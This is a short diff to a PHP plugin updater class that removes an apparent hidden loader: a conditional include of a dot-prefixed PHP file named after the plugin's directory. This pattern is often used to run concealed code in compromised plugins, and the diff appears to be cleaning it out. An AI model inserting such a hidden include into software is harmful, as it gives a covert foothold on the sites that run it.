@@ -11,10 +11,6 @@ if ( !class_exists( 'WeDevs_License_Update' ) ):
  * @author Tareq Hasan
  * @version 0.3
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WeDevs_Updater {
 
     protected $base_plugin_key = 'cpm-pro';
